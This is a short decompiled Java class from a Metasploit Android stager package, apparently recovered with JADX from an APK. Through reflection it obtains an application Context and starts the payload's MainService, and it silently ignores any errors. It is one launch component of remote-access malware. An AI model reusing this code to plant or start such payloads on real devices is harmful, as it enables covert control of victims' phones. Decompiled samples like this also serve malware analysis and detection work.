package com.metasploit.stage;

import android.content.Context;
import java.lang.reflect.Method;
/* loaded from: classes.dex */
final class c implements Runnable {
    private /* synthetic */ Method a;

    /* JADX INFO: Access modifiers changed from: package-private */
    public c(Method method) {
        this.a = method;
    }

    @Override // java.lang.Runnable
    public final void run() {
        try {
            Context context = (Context) this.a.invoke(null, null);
            if (context != null) {
                MainService.startService(context);
            }
        } catch (Exception e) {
        }
    }
}
